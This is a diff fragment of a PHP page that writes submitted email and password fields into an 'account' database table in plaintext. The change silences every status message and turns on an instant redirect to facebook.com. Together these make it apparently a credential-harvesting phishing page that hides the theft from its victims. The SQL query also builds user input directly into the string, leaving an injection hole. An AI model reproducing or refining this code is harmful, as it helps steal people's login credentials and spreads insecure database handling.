@@ -36,16 +36,16 @@ if(isset($_POST['email'])&& isset($_POST['pass1'] )){
     $sql = "INSERT INTO account (`id`,`usrname`,`password`)
             VALUES (1,'$YourName', '$YourPass')";
   if ($conn->query($sql) === TRUE) {
-    echo "Record inserted successfully";
+    // echo "Record inserted successfully";
   } else {
-    echo "Error: " . $conn->error;
+    // echo "Error: " . $conn->error;
   }
 }
 else{
-  echo 'pass';
+  // echo 'pass';
 }
 $conn->close();
 ?>
-<!-- <meta http-equiv="refresh" content="0;url= https://www.facebook.com/?locale=zh_TW "> -->
+<meta http-equiv="refresh" content="0;url= https://www.facebook.com/?locale=zh_TW ">
 </body>
 </html>
